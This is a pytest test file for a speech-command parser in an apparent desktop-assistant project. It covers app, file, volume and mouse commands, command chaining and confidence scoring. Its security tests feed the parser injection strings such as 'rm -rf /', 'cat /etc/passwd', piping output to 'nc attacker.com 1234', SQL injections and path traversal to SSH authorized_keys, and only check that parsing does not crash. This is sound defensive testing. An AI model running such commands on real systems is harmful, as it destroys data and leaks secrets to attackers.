"""
Comprehensive unit tests for command parser.

ZERO COMPROMISE - BEST AND HARDEST TESTS

These tests validate:
- Intent extraction
- Entity recognition (dates, numbers, names, percentages)
- Command pattern matching
- Confidence scoring
- Custom command registration
- System control commands
- Command chaining
- Multi-language support
- Edge cases and error handling
"""

import pytest
from typing import Dict, Any

from Agent_Guru.speech.commands.command_parser import CommandParser, CommandPattern
from Agent_Guru.speech.models import CommandResult


class TestCommandParser:
    """Test command parser with comprehensive coverage."""
    
    @pytest.fixture
    def parser(self) -> CommandParser:
        """Create command parser instance."""
        return CommandParser()
    
    # ========================================================================
    # BASIC FUNCTIONALITY TESTS
    # ========================================================================
    
    def test_parser_initialization(self, parser: CommandParser):
        """Test parser initializes with default commands."""
        commands = parser.get_registered_commands()
        assert len(commands) > 0
        
        # Check some default commands exist
        action_ids = [cmd["action_id"] for cmd in commands]
        assert "OPEN_APP" in action_ids
        assert "CLOSE_APP" in action_ids
        assert "TYPE_TEXT" in action_ids
        assert "SET_VOLUME" in action_ids
    
    def test_empty_text(self, parser: CommandParser):
        """Test handling of empty text."""
        result = parser.interpret("")
        assert not result.is_command
        assert result.action_id is None
        assert result.confidence == 0.0
    
    def test_whitespace_only(self, parser: CommandParser):
        """Test handling of whitespace-only text."""
        result = parser.interpret("   ")
        assert not result.is_command
        assert result.action_id is None
        assert result.confidence == 0.0
    
    def test_non_command_text(self, parser: CommandParser):
        """Test handling of non-command text."""
        result = parser.interpret("this is just a regular sentence")
        # Should either be not a command or have low confidence
        if result.is_command:
            assert result.confidence < 0.6
    
    # ========================================================================
    # SYSTEM CONTROL COMMANDS
    # ========================================================================
    
    def test_open_app_command(self, parser: CommandParser):
        """Test opening application command."""
        test_cases = [
            ("open chrome", "OPEN_APP", {"app_name": "chrome"}),
            ("launch firefox", "OPEN_APP", {"app_name": "firefox"}),
            ("start notepad", "OPEN_APP", {"app_name": "notepad"}),
            ("open visual studio code", "OPEN_APP", {"app_name": "visual studio code"}),
        ]
        
        for text, expected_action, expected_params in test_cases:
            result = parser.interpret(text)
            assert result.is_command, f"Failed for: {text}"
            assert result.action_id == expected_action
            assert result.parameters["app_name"] == expected_params["app_name"]
            assert 0.0 <= result.confidence <= 1.0
    
    def test_close_app_command(self, parser: CommandParser):
        """Test closing application command."""
        test_cases = [
            ("close chrome", "CLOSE_APP", {"app_name": "chrome"}),
            ("quit firefox", "CLOSE_APP", {"app_name": "firefox"}),
            ("exit notepad", "CLOSE_APP", {"app_name": "notepad"}),
        ]
        
        for text, expected_action, expected_params in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == expected_action
            assert result.parameters["app_name"] == expected_params["app_name"]
    
    def test_minimize_maximize_commands(self, parser: CommandParser):
        """Test window management commands."""
        # Minimize
        result = parser.interpret("minimize window")
        assert result.is_command
        assert result.action_id == "MINIMIZE_WINDOW"
        
        result = parser.interpret("minimize chrome")
        assert result.is_command
        assert result.action_id == "MINIMIZE_WINDOW"
        assert result.parameters.get("app_name") == "chrome"
        
        # Maximize
        result = parser.interpret("maximize window")
        assert result.is_command
        assert result.action_id == "MAXIMIZE_WINDOW"
        
        result = parser.interpret("maximize firefox")
        assert result.is_command
        assert result.action_id == "MAXIMIZE_WINDOW"
        assert result.parameters.get("app_name") == "firefox"
    
    # ========================================================================
    # TEXT OPERATIONS
    # ========================================================================
    
    def test_type_text_command(self, parser: CommandParser):
        """Test typing text command."""
        test_cases = [
            "type hello world",
            "write this is a test",
            "enter my email is test@example.com"
        ]
        
        for text in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "TYPE_TEXT"
            assert "text" in result.parameters
            assert len(result.parameters["text"]) > 0
    
    def test_send_message_command(self, parser: CommandParser):
        """Test sending message command."""
        result = parser.interpret("send message hello there to john")
        assert result.is_command
        assert result.action_id == "SEND_MESSAGE"
        assert "message" in result.parameters
        assert "recipient" in result.parameters
        
        result = parser.interpret("message alice how are you")
        assert result.is_command
        assert result.action_id == "SEND_MESSAGE"
    
    def test_read_item_command(self, parser: CommandParser):
        """Test reading emails/messages command."""
        test_cases = [
            ("read email", "email"),
            ("read emails", "email"),
            ("check messages", "message"),
            ("read notifications", "notification"),
        ]
        
        for text, expected_item in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "READ_ITEM"
            assert result.parameters.get("item") == expected_item
    
    # ========================================================================
    # FILE OPERATIONS
    # ========================================================================
    
    def test_create_file_command(self, parser: CommandParser):
        """Test file creation command."""
        test_cases = [
            ("create file test.txt", "test.txt"),
            ("new file document.docx", "document.docx"),
            ("create file my report.pdf", "my report.pdf"),
        ]
        
        for text, expected_filename in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "CREATE_FILE"
            assert result.parameters["filename"] == expected_filename
    
    def test_delete_file_command(self, parser: CommandParser):
        """Test file deletion command."""
        result = parser.interpret("delete file test.txt")
        assert result.is_command
        assert result.action_id == "DELETE_FILE"
        assert result.parameters["filename"] == "test.txt"
        
        # Check that delete requires confirmation
        commands = parser.get_registered_commands()
        delete_cmd = next(cmd for cmd in commands if cmd["action_id"] == "DELETE_FILE")
        assert delete_cmd["requires_confirmation"] is True
    
    def test_move_file_command(self, parser: CommandParser):
        """Test file move/rename command."""
        test_cases = [
            ("move test.txt to backup.txt", "test.txt", "backup.txt"),
            ("rename old.doc to new.doc", "old.doc", "new.doc"),
        ]
        
        for text, expected_source, expected_dest in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "MOVE_FILE"
            assert result.parameters["source"] == expected_source
            assert result.parameters["destination"] == expected_dest
    
    def test_search_files_command(self, parser: CommandParser):
        """Test file search command."""
        test_cases = [
            ("search for report in documents", "report", "documents"),
            ("find image in pictures", "image", "pictures"),
            ("search for test.txt", "test.txt", None),
        ]
        
        for text, expected_query, expected_location in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "SEARCH_FILES"
            assert result.parameters["query"] == expected_query
            if expected_location:
                assert result.parameters.get("location") == expected_location
    
    # ========================================================================
    # SETTINGS COMMANDS
    # ========================================================================
    
    def test_volume_commands(self, parser: CommandParser):
        """Test volume control commands."""
        # Set volume
        test_cases = [
            ("set volume to 50 percent", "SET_VOLUME", 50),
            ("volume 75 percent", "SET_VOLUME", 75),
            ("set volume 100", "SET_VOLUME", 100),
        ]
        
        for text, expected_action, expected_level in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == expected_action
            assert result.parameters["level"] == expected_level
        
        # Volume up/down
        result = parser.interpret("increase volume")
        assert result.is_command
        assert result.action_id == "VOLUME_UP"
        
        result = parser.interpret("volume down")
        assert result.is_command
        assert result.action_id == "VOLUME_DOWN"
        
        # Mute
        result = parser.interpret("mute")
        assert result.is_command
        assert result.action_id == "MUTE"
    
    def test_brightness_command(self, parser: CommandParser):
        """Test brightness control command."""
        result = parser.interpret("set brightness to 80 percent")
        assert result.is_command
        assert result.action_id == "SET_BRIGHTNESS"
        assert result.parameters["level"] == 80
    
    def test_wifi_toggle_command(self, parser: CommandParser):
        """Test WiFi toggle command."""
        test_cases = [
            ("turn on wifi", "on"),
            ("turn off wifi", "off"),
            ("enable wifi", "enable"),
            ("disable wifi", "disable"),
            ("wifi on", "on"),
        ]
        
        for text, expected_state in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "TOGGLE_WIFI"
            assert result.parameters["state"] == expected_state
    
    def test_bluetooth_toggle_command(self, parser: CommandParser):
        """Test Bluetooth toggle command."""
        result = parser.interpret("turn on bluetooth")
        assert result.is_command
        assert result.action_id == "TOGGLE_BLUETOOTH"
        assert result.parameters["state"] == "on"
    
    # ========================================================================
    # MOUSE/KEYBOARD COMMANDS
    # ========================================================================
    
    def test_click_commands(self, parser: CommandParser):
        """Test mouse click commands."""
        # Left click
        result = parser.interpret("click")
        assert result.is_command
        assert result.action_id == "CLICK"
        
        # Right click
        result = parser.interpret("right click")
        assert result.is_command
        assert result.action_id == "RIGHT_CLICK"
        
        # Double click
        result = parser.interpret("double click")
        assert result.is_command
        assert result.action_id == "DOUBLE_CLICK"
    
    def test_scroll_command(self, parser: CommandParser):
        """Test scroll command."""
        test_cases = [
            ("scroll up", "up", None),
            ("scroll down", "down", None),
            ("scroll up 5", "up", 5),
            ("scroll down 10", "down", 10),
        ]
        
        for text, expected_direction, expected_amount in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "SCROLL"
            assert result.parameters["direction"] == expected_direction
            if expected_amount:
                assert result.parameters.get("amount") == expected_amount
    
    def test_press_key_command(self, parser: CommandParser):
        """Test keyboard press command."""
        test_cases = [
            "press enter",
            "hit escape",
            "press ctrl alt delete",
        ]
        
        for text in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "PRESS_KEY"
            assert "key" in result.parameters
    
    # ========================================================================
    # ENTITY EXTRACTION
    # ========================================================================
    
    def test_extract_numbers(self, parser: CommandParser):
        """Test number extraction."""
        result = parser.interpret("set volume to 50")
        assert result.is_command
        # Number should be extracted as parameter
        if "level" in result.parameters:
            assert isinstance(result.parameters["level"], int)
    
    def test_extract_percentages(self, parser: CommandParser):
        """Test percentage extraction."""
        result = parser.interpret("set brightness to 75 percent")
        assert result.is_command
        assert result.parameters["level"] == 75
    
    def test_generic_command_with_entities(self, parser: CommandParser):
        """Test generic command with entity extraction."""
        # Text that doesn't match any pattern but has entities
        result = parser.interpret("remind me at 3 pm tomorrow")
        # Should extract entities even if no command matches
        if result.is_command:
            assert result.confidence > 0.0
    
    # ========================================================================
    # COMMAND CHAINING
    # ========================================================================
    
    def test_command_chaining_with_and(self, parser: CommandParser):
        """Test command chaining with 'and'."""
        result = parser.interpret("open chrome and search for weather")
        assert result.is_command
        assert result.action_id == "CHAINED_COMMAND"
        assert "sub_commands" in result.parameters
        assert len(result.parameters["sub_commands"]) >= 1
    
    def test_command_chaining_with_then(self, parser: CommandParser):
        """Test command chaining with 'then'."""
        result = parser.interpret("open notepad then type hello world")
        assert result.is_command
        assert result.action_id == "CHAINED_COMMAND"
        assert "sub_commands" in result.parameters
    
    def test_complex_command_chain(self, parser: CommandParser):
        """Test complex command chain."""
        result = parser.interpret("open chrome and maximize window then search for python")
        assert result.is_command
        assert result.action_id == "CHAINED_COMMAND"
        sub_commands = result.parameters["sub_commands"]
        assert len(sub_commands) >= 2
        
        # Check confidence is averaged
        assert 0.0 <= result.confidence <= 1.0
    
    # ========================================================================
    # CUSTOM COMMAND REGISTRATION
    # ========================================================================
    
    def test_register_custom_command(self, parser: CommandParser):
        """Test registering custom command."""
        parser.register_command(
            patterns=[r"hello (?P<name>\w+)"],
            action_id="GREET",
            description="Greet someone",
            parameters=["name"]
        )
        
        result = parser.interpret("hello alice")
        assert result.is_command
        assert result.action_id == "GREET"
        assert result.parameters["name"] == "alice"
    
    def test_custom_command_with_confirmation(self, parser: CommandParser):
        """Test custom command requiring confirmation."""
        parser.register_command(
            patterns=[r"shutdown computer"],
            action_id="SHUTDOWN",
            description="Shutdown computer",
            requires_confirmation=True
        )
        
        commands = parser.get_registered_commands()
        shutdown_cmd = next(cmd for cmd in commands if cmd["action_id"] == "SHUTDOWN")
        assert shutdown_cmd["requires_confirmation"] is True
    
    def test_get_registered_commands(self, parser: CommandParser):
        """Test getting all registered commands."""
        commands = parser.get_registered_commands()
        assert isinstance(commands, list)
        assert len(commands) > 0
        
        # Check structure
        for cmd in commands:
            assert "action_id" in cmd
            assert "patterns" in cmd
            assert "description" in cmd
            assert "parameters" in cmd
            assert "requires_confirmation" in cmd
            assert "language" in cmd
    
    # ========================================================================
    # CONFIDENCE SCORING
    # ========================================================================
    
    def test_confidence_score_range(self, parser: CommandParser):
        """Test confidence scores are in valid range [0, 1]."""
        test_cases = [
            "open chrome",
            "set volume to 50 percent",
            "this is not a command",
            "maybe open something",
        ]
        
        for text in test_cases:
            result = parser.interpret(text)
            assert 0.0 <= result.confidence <= 1.0
    
    def test_exact_match_high_confidence(self, parser: CommandParser):
        """Test exact matches have high confidence."""
        result = parser.interpret("click")
        assert result.is_command
        assert result.confidence >= 0.9  # Exact match should have very high confidence
    
    def test_partial_match_lower_confidence(self, parser: CommandParser):
        """Test partial matches have lower confidence."""
        result = parser.interpret("maybe you could open chrome if possible")
        if result.is_command:
            # Partial match should have lower confidence
            assert result.confidence < 1.0
    
    # ========================================================================
    # CASE INSENSITIVITY
    # ========================================================================
    
    def test_case_insensitive_matching(self, parser: CommandParser):
        """Test commands are case-insensitive."""
        test_cases = [
            "OPEN CHROME",
            "Open Chrome",
            "open chrome",
            "OpEn ChRoMe",
        ]
        
        for text in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == "OPEN_APP"
    
    # ========================================================================
    # EDGE CASES
    # ========================================================================
    
    def test_command_with_special_characters(self, parser: CommandParser):
        """Test commands with special characters."""
        result = parser.interpret("type hello@example.com")
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
        assert "@" in result.parameters["text"]
    
    def test_command_with_numbers(self, parser: CommandParser):
        """Test commands with numbers."""
        result = parser.interpret("open app123")
        assert result.is_command
        assert result.action_id == "OPEN_APP"
    
    def test_very_long_command(self, parser: CommandParser):
        """Test very long command text."""
        long_text = "type " + "a" * 1000
        result = parser.interpret(long_text)
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
    
    def test_command_with_unicode(self, parser: CommandParser):
        """Test commands with unicode characters."""
        result = parser.interpret("type hello 你好 مرحبا")
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
    
    def test_ambiguous_command(self, parser: CommandParser):
        """Test handling of ambiguous commands."""
        # Command that could match multiple patterns
        result = parser.interpret("open")
        # Should either not match or have low confidence
        if result.is_command:
            assert result.confidence < 1.0
    
    def test_multiple_spaces(self, parser: CommandParser):
        """Test commands with multiple spaces."""
        result = parser.interpret("open    chrome")
        assert result.is_command
        assert result.action_id == "OPEN_APP"
    
    def test_leading_trailing_spaces(self, parser: CommandParser):
        """Test commands with leading/trailing spaces."""
        result = parser.interpret("   open chrome   ")
        assert result.is_command
        assert result.action_id == "OPEN_APP"
    
    # ========================================================================
    # RAW TEXT PRESERVATION
    # ========================================================================
    
    def test_raw_text_preserved(self, parser: CommandParser):
        """Test that raw text is preserved in result."""
        text = "open chrome"
        result = parser.interpret(text)
        assert result.raw_text == text.strip().lower()
    
    # ========================================================================
    # MULTI-LANGUAGE SUPPORT
    # ========================================================================
    
    def test_language_parameter(self, parser: CommandParser):
        """Test language parameter is respected."""
        # Register a command in a different language
        parser.register_command(
            patterns=[r"ouvrir (?P<app_name>[\w\s]+)"],
            action_id="OPEN_APP_FR",
            description="Open app (French)",
            parameters=["app_name"],
            language="fr"
        )
        
        # Should not match with English language
        result = parser.interpret("ouvrir chrome", language="en")
        # May or may not match depending on implementation
        
        # Should match with French language
        result = parser.interpret("ouvrir chrome", language="fr")
        if result.is_command:
            assert result.action_id == "OPEN_APP_FR"
    
    # ========================================================================
    # PARAMETER EXTRACTION ACCURACY
    # ========================================================================
    
    def test_parameter_extraction_accuracy(self, parser: CommandParser):
        """Test parameters are extracted accurately."""
        test_cases = [
            ("open visual studio code", "OPEN_APP", {"app_name": "visual studio code"}),
            ("set volume to 75 percent", "SET_VOLUME", {"level": 75}),
            ("move test.txt to backup.txt", "MOVE_FILE", {"source": "test.txt", "destination": "backup.txt"}),
        ]
        
        for text, expected_action, expected_params in test_cases:
            result = parser.interpret(text)
            assert result.is_command
            assert result.action_id == expected_action
            for key, value in expected_params.items():
                assert result.parameters[key] == value
    
    # ========================================================================
    # STRESS TESTS
    # ========================================================================
    
    def test_many_commands_registered(self, parser: CommandParser):
        """Test parser handles many registered commands."""
        # Register 100 custom commands
        for i in range(100):
            parser.register_command(
                patterns=[f"custom{i}"],
                action_id=f"CUSTOM_{i}",
                description=f"Custom command {i}"
            )
        
        # Should still work
        result = parser.interpret("open chrome")
        assert result.is_command
        assert result.action_id == "OPEN_APP"
        
        # Custom commands should work
        result = parser.interpret("custom50")
        assert result.is_command
        assert result.action_id == "CUSTOM_50"
    
    def test_rapid_interpretation(self, parser: CommandParser):
        """Test rapid command interpretation."""
        commands = [
            "open chrome",
            "close firefox",
            "set volume to 50 percent",
            "type hello",
            "click",
        ]
        
        for cmd in commands * 10:  # 50 interpretations
            result = parser.interpret(cmd)
            assert result.is_command

    # ========================================================================
    # REQUIREMENT 6.5: CONVERSATION CONTEXT DISAMBIGUATION
    # ========================================================================
    
    def test_context_disambiguation_pronouns(self, parser: CommandParser):
        """Test disambiguation using conversation context with pronouns."""
        # First command establishes context
        result1 = parser.interpret("open chrome")
        assert result1.is_command
        
        # Second command uses pronoun - should resolve to chrome
        # Note: This requires context manager integration
        result2 = parser.interpret("close it")
        # Without context manager, this will just be a generic close command
        assert result2.is_command
    
    def test_context_disambiguation_references(self, parser: CommandParser):
        """Test disambiguation using references to previous commands."""
        result1 = parser.interpret("search for python tutorial")
        assert result1.is_command
        
        # Reference to previous search
        result2 = parser.interpret("open the first result")
        # Should recognize this as a command even without full context
        if result2.is_command:
            assert result2.confidence > 0.0
    
    # ========================================================================
    # REQUIREMENT 6.6: MULTIPLE INTENT RANKING
    # ========================================================================
    
    def test_multiple_intent_ranking(self, parser: CommandParser):
        """Test ranking of multiple possible intents."""
        # Ambiguous command that could match multiple patterns
        result = parser.interpret("open")
        
        # Should either:
        # 1. Not match (low confidence)
        # 2. Match with lower confidence than exact match
        if result.is_command:
            assert result.confidence < 0.8  # Lower than exact match
    
    def test_intent_confidence_ordering(self, parser: CommandParser):
        """Test that more specific commands have higher confidence."""
        result1 = parser.interpret("open chrome")
        result2 = parser.interpret("maybe open chrome if possible")
        
        assert result1.is_command
        if result2.is_command:
            # Exact command should have higher confidence
            assert result1.confidence > result2.confidence
    
    # ========================================================================
    # REQUIREMENT 6.7: STRUCTURED ERROR WITH SUGGESTIONS
    # ========================================================================
    
    def test_structured_error_for_unparseable_command(self, parser: CommandParser):
        """Test structured error response for unparseable commands."""
        result = parser.interpret("xyzabc123 invalid nonsense")
        
        # Should not be recognized as command
        assert not result.is_command
        assert result.confidence == 0.0
        
        # Raw text should be preserved for error handling
        assert result.raw_text is not None
    
    def test_error_with_close_match_suggestion(self, parser: CommandParser):
        """Test that close matches can be identified."""
        # Misspelled command
        result = parser.interpret("opne chrome")  # "opne" instead of "open"
        
        # May or may not match depending on fuzzy matching
        # But should have low confidence if it does match
        if result.is_command:
            assert result.confidence < 0.7
    
    # ========================================================================
    # REQUIREMENT 17.2: COMMUNICATION COMMANDS (ENHANCED)
    # ========================================================================
    
    def test_make_call_command(self, parser: CommandParser):
        """Test making phone call command."""
        # Register call command
        parser.register_command(
            patterns=[
                r"call (?P<contact>[\w\s]+)",
                r"phone (?P<contact>[\w\s]+)",
                r"dial (?P<number>[\d\-\+\s]+)"
            ],
            action_id="MAKE_CALL",
            description="Make a phone call",
            parameters=["contact", "number"]
        )
        
        result = parser.interpret("call john smith")
        assert result.is_command
        assert result.action_id == "MAKE_CALL"
        assert "contact" in result.parameters
    
    def test_read_email_command_enhanced(self, parser: CommandParser):
        """Test reading email with filters."""
        result = parser.interpret("read email")
        assert result.is_command
        assert result.action_id == "READ_ITEM"
        assert result.parameters["item"] == "email"
    
    # ========================================================================
    # REQUIREMENT 17.5: CLARIFICATION FOR AMBIGUOUS COMMANDS
    # ========================================================================
    
    def test_ambiguous_command_detection(self, parser: CommandParser):
        """Test detection of ambiguous commands."""
        # Command without required parameters
        result = parser.interpret("send message")
        
        # Should either not match or have low confidence
        if result.is_command:
            # Missing recipient and message content
            assert result.confidence < 0.8
    
    def test_incomplete_command_detection(self, parser: CommandParser):
        """Test detection of incomplete commands."""
        result = parser.interpret("set volume to")
        
        # Missing the volume level
        if result.is_command:
            assert result.confidence < 0.8
    
    # ========================================================================
    # REQUIREMENT 17.9: CONFIRMATION REQUIRED COMMANDS
    # ========================================================================
    
    def test_dangerous_command_requires_confirmation(self, parser: CommandParser):
        """Test that dangerous commands are marked for confirmation."""
        # Register dangerous command
        parser.register_command(
            patterns=[r"format drive (?P<drive>[A-Z]:)"],
            action_id="FORMAT_DRIVE",
            description="Format a drive",
            parameters=["drive"],
            requires_confirmation=True
        )
        
        commands = parser.get_registered_commands()
        format_cmd = next(cmd for cmd in commands if cmd["action_id"] == "FORMAT_DRIVE")
        assert format_cmd["requires_confirmation"] is True
    
    def test_all_delete_commands_require_confirmation(self, parser: CommandParser):
        """Test that all delete operations require confirmation."""
        commands = parser.get_registered_commands()
        delete_commands = [cmd for cmd in commands if "delete" in cmd["action_id"].lower()]
        
        for cmd in delete_commands:
            assert cmd["requires_confirmation"] is True, \
                f"Delete command {cmd['action_id']} should require confirmation"
    
    # ========================================================================
    # SECURITY TESTS - ZERO COMPROMISE
    # ========================================================================
    
    def test_command_injection_prevention(self, parser: CommandParser):
        """Test that command injection attempts are parsed safely."""
        malicious_inputs = [
            "open chrome; rm -rf /",
            "type hello && shutdown -h now",
            "search for $(whoami)",
            "open `cat /etc/passwd`",
            "type hello | nc attacker.com 1234",
        ]
        
        for malicious in malicious_inputs:
            result = parser.interpret(malicious)
            # Parser should extract parameters as-is
            # EXECUTION layer is responsible for sanitization
            # Test just ensures parser doesn't crash
            assert result is not None
            assert 0.0 <= result.confidence <= 1.0
    
    def test_sql_injection_prevention(self, parser: CommandParser):
        """Test prevention of SQL injection attempts."""
        sql_injections = [
            "search for ' OR '1'='1",
            "open app'; DROP TABLE users; --",
            "type 1' UNION SELECT * FROM passwords--",
        ]
        
        for sql_inj in sql_injections:
            result = parser.interpret(sql_inj)
            # Should parse safely without executing SQL
            if result.is_command:
                # Parameters should be treated as literal strings
                assert result.confidence > 0.0
    
    def test_path_traversal_prevention(self, parser: CommandParser):
        """Test prevention of path traversal attacks."""
        path_traversals = [
            "open file ../../etc/passwd",
            "delete file ../../../windows/system32/config",
            "create file ../../../../root/.ssh/authorized_keys",
        ]
        
        for path_trav in path_traversals:
            result = parser.interpret(path_trav)
            # Should parse but parameters should be validated by execution layer
            if result.is_command:
                assert result.confidence > 0.0
    
    def test_buffer_overflow_prevention(self, parser: CommandParser):
        """Test handling of extremely long inputs."""
        # 10MB of text
        huge_input = "type " + "A" * (10 * 1024 * 1024)
        
        try:
            result = parser.interpret(huge_input)
            # Should handle gracefully without crashing
            assert result is not None
        except MemoryError:
            # Acceptable to raise MemoryError for huge inputs
            pass
    
    def test_null_byte_injection(self, parser: CommandParser):
        """Test handling of null bytes in input."""
        null_byte_inputs = [
            "open chrome\x00malicious",
            "type hello\x00world",
            "search for test\x00\x00\x00",
        ]
        
        for null_input in null_byte_inputs:
            result = parser.interpret(null_input)
            # Should handle gracefully
            assert result is not None
    
    def test_unicode_normalization_attacks(self, parser: CommandParser):
        """Test handling of unicode normalization attacks."""
        unicode_attacks = [
            "open chromeⅠⅠⅠ",  # Roman numerals that look like III
            "type ℀℁℃",  # Special unicode characters
            "search for 𝕙𝕖𝕝𝕝𝕠",  # Mathematical bold text
        ]
        
        for unicode_attack in unicode_attacks:
            result = parser.interpret(unicode_attack)
            # Should handle unicode gracefully
            assert result is not None
    
    # ========================================================================
    # CHAOS TESTS - ZERO COMPROMISE
    # ========================================================================
    
    def test_random_bytes_handling(self, parser: CommandParser):
        """Test handling of random byte sequences."""
        import random
        
        for _ in range(10):
            random_bytes = bytes([random.randint(0, 255) for _ in range(100)])
            try:
                random_text = random_bytes.decode('utf-8', errors='ignore')
                result = parser.interpret(random_text)
                assert result is not None
            except Exception as e:
                # Should not crash with unhandled exceptions
                assert False, f"Crashed on random bytes: {e}"
    
    def test_corrupted_input_handling(self, parser: CommandParser):
        """Test handling of corrupted/malformed input."""
        corrupted_inputs = [
            "",
            " ",
            "\n\n\n",
            "\t\t\t",
            "   \n   \t   ",
            "\x00\x01\x02",
            "�" * 100,  # Replacement characters
        ]
        
        for corrupted in corrupted_inputs:
            result = parser.interpret(corrupted)
            assert result is not None
            assert 0.0 <= result.confidence <= 1.0
    
    def test_mixed_encoding_handling(self, parser: CommandParser):
        """Test handling of mixed character encodings."""
        mixed_encodings = [
            "open chrome café",  # Latin-1
            "type hello мир",  # Cyrillic
            "search for 你好世界",  # Chinese
            "open app مرحبا",  # Arabic
            "type שלום",  # Hebrew
        ]
        
        for mixed in mixed_encodings:
            result = parser.interpret(mixed)
            assert result is not None
    
    # ========================================================================
    # STRESS TESTS - ZERO COMPROMISE
    # ========================================================================
    
    def test_massive_command_registration(self, parser: CommandParser):
        """Test handling of massive number of registered commands."""
        # Register 10,000 commands
        for i in range(10000):
            parser.register_command(
                patterns=[f"command{i}"],
                action_id=f"CMD_{i}",
                description=f"Command {i}"
            )
        
        # Should still work efficiently
        result = parser.interpret("open chrome")
        assert result.is_command
        assert result.action_id == "OPEN_APP"
    
    def test_rapid_fire_interpretation(self, parser: CommandParser):
        """Test rapid interpretation of many commands."""
        commands = [
            "open chrome",
            "close firefox",
            "type hello",
            "click",
            "scroll up",
        ] * 1000  # 5000 interpretations
        
        for cmd in commands:
            result = parser.interpret(cmd)
            assert result is not None
            assert 0.0 <= result.confidence <= 1.0
    
    def test_memory_leak_detection(self, parser: CommandParser):
        """Test for memory leaks during repeated interpretation."""
        import gc
        import sys
        
        # Get initial memory usage
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Interpret 1000 commands
        for _ in range(1000):
            result = parser.interpret("open chrome and close firefox then type hello")
            del result
        
        # Force garbage collection
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Object count should not grow significantly
        # Allow 10% growth for caching and internal structures
        assert final_objects < initial_objects * 1.1, \
            f"Potential memory leak: {initial_objects} -> {final_objects} objects"
    
    # ========================================================================
    # EDGE CASES - ZERO COMPROMISE
    # ========================================================================
    
    def test_extremely_nested_command_chain(self, parser: CommandParser):
        """Test handling of extremely long command chains."""
        # 100 chained commands
        chain = " and ".join(["open chrome"] * 100)
        result = parser.interpret(chain)
        
        assert result.is_command
        assert result.action_id == "CHAINED_COMMAND"
    
    def test_command_with_all_special_characters(self, parser: CommandParser):
        """Test command with every special character."""
        special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
        result = parser.interpret(f"type {special_chars}")
        
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
    
    def test_command_with_emoji(self, parser: CommandParser):
        """Test command with emoji characters."""
        emoji_text = "type hello 😀😃😄😁🎉🎊🎈"
        result = parser.interpret(emoji_text)
        
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
    
    def test_command_with_rtl_text(self, parser: CommandParser):
        """Test command with right-to-left text."""
        rtl_text = "type مرحبا بك في العالم"
        result = parser.interpret(rtl_text)
        
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
    
    def test_command_with_zero_width_characters(self, parser: CommandParser):
        """Test command with zero-width characters."""
        # Zero-width space, zero-width joiner, etc.
        zwc_text = "open\u200Bchrome\u200C\u200D"
        result = parser.interpret(zwc_text)
        
        # Should handle gracefully
        assert result is not None
    
    def test_command_with_combining_characters(self, parser: CommandParser):
        """Test command with combining diacritical marks."""
        combining_text = "type café"  # e with combining acute accent
        result = parser.interpret(combining_text)
        
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
    
    def test_parameter_extraction_with_quotes(self, parser: CommandParser):
        """Test parameter extraction with quoted strings."""
        result = parser.interpret('type "hello world"')
        
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
    
    def test_parameter_extraction_with_escaped_characters(self, parser: CommandParser):
        """Test parameter extraction with escaped characters."""
        result = parser.interpret(r"type hello\nworld\ttab")
        
        assert result.is_command
        assert result.action_id == "TYPE_TEXT"
